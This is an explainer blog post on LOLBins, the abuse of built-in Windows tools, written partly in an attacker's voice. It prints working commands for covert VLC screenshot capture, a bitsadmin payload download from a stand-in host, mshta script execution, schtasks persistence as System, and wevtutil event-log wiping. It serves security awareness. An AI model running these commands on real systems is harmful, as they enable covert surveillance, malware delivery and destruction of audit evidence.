

# What is LOLBins?

**LOLBins: The Silent Cyber Ninja**
Imagine hacking into a system without ever needing to upload malware. Instead, you just use what's already there — like a digital ninja, hiding in plain sight.

LOLBins (Living Off the Land Binaries) is a fascinating and dangerous technique where attackers utilize legitimate, pre-installed Windows tools and binaries to perform malicious activities. These binaries are intended for everyday use, but in the wrong hands, they can turn a target system's strengths into weaknesses. Let’s explore how attackers can bypass traditional malware defenses with LOLBins.

**What Can LOLBins Do?**
By leveraging trusted system tools, attackers can execute commands, gather sensitive information, move laterally across networks, and maintain persistence — all while avoiding detection. Security software often trusts these built-in utilities, making LOLBins a subtle yet powerful method for cyberattacks.

**PowerShell + VLC = Silent Screenshots**
Imagine gaining access to a system and discovering that VLC Player is installed. Instead of dropping new malware, you can cleverly repurpose this innocent media player into a surveillance tool. Here’s how you can use PowerShell to command VLC to take screenshots:

```PowerShell
function Take-VlcScreenshot {
    param(
        [string]$outputPath = "C:\Screenshots"
    )
    $vlcPath = "C:\Program Files\VideoLAN\VLC\vlc.exe"
    $command = "--screen-fps=1 :screen-follow-mouse --video-filter=scene --vout=dummy --scene-format=png --scene-prefix=screenshot --scene-path=$outputPath screen:// --run-time=5 vlc://quit"
    Start-Process -FilePath $vlcPath -ArgumentList $command -NoNewWindow
}
```
Here’s what this command does:

Takes a screenshot of the user’s screen every second for five seconds.
Stores the screenshots in the specified directory (C:\Screenshots).
Closes VLC silently after the operation is completed.
Why is this interesting? Because the entire operation is stealthy, leveraging VLC Player, a benign program that’s trusted and already installed. No red flags are raised in traditional security monitoring tools.

**Pushing the Boundaries with LOLBins**
But why stop at screenshots? The real beauty of LOLBins is in their flexibility. Once you master using legitimate tools for unintended purposes, the possibilities become endless. Here are a few other malicious tricks you can pull off using pre-existing system utilities:

**1. Downloading Files with bitsadmin.exe**
bitsadmin.exe is a command-line tool for managing download jobs. However, it can also be misused to download files from remote servers — like malware.

```PowerShell
bitsadmin /transfer myDownloadJob /download /priority high https://example.com/payload.exe C:\Users\Public\payload.exe
```
This command downloads a file from the internet and places it in the C:\Users\Public directory, all under the radar of traditional malware detection tools.

**2. Executing Remote Code via mshta.exe**
mshta.exe is used to execute HTML applications (HTA files). Attackers can exploit this to execute malicious scripts directly from the internet.

```PowerShell
mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Run('calc.exe');close();"
```
This opens up Calculator, but it could just as easily execute a more harmful program. By using trusted binaries like mshta.exe, attackers can run arbitrary code on target systems without triggering alarms.

**3. Creating Persistence with schtasks.exe**
Attackers can ensure that their malicious payload runs every time the system starts by using the schtasks.exe tool, which is used to schedule tasks.

```PowerShell
schtasks /create /sc onstart /tn "Persistence" /tr "C:\path\to\malware.exe" /ru System
```
This command schedules a malicious executable (malware.exe) to run every time the system starts, granting the attacker persistence without needing any third-party tools.

**4. Wiping Evidence with wevtutil.exe**
Once the attack is complete, the attacker might want to cover their tracks by clearing the event logs using wevtutil.exe, a tool used to manage event logs.
```PowerShell
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```
These commands clear the System, Security, and Application logs, erasing evidence of their malicious activities.

**Final Thoughts:** The Power and Danger of LOLBins
LOLBins highlight the dual nature of built-in system utilities. While they’re essential for administrators, they can be easily manipulated by attackers for sinister purposes. The key lesson here is that no software is inherently safe. As cybersecurity professionals, we must remain vigilant and aware of how legitimate tools can be weaponized.

As we’ve seen with the PowerShell VLC screenshot example, and other LOLBin tricks, an attacker can fly under the radar using the very tools designed to help manage and protect systems.

***"The quieter you become, the more you are able to hear." – Ram Dass***

This perfectly encapsulates the nature of LOLBins in the hands of an attacker — quietly slipping by unnoticed while doing their work.

So, next time you fire up VLC or PowerShell, remember: the simplest tools often hold the most potential for both good and bad.